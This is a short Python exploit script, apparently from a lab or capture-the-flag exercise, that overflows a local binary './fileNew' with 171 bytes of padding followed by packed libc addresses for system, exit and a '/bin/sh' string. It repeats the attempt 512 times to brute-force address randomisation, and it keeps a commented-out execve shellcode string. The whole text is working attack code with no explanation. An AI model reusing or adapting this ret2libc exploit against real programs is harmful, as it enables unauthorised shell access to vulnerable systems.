from subprocess import call
from struct import pack

fuzz = "A"*171
baseAddr = 0xf7d42000
sys = pack("I",baseAddr+0x00044620)
ex = pack("I",baseAddr+0x00037390)
shell=pack("I",baseAddr+0x188406)
#shell = "\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
payload = fuzz + sys + ex + shell

for i in range(512):
	print(i)
	call(["./fileNew", payload])
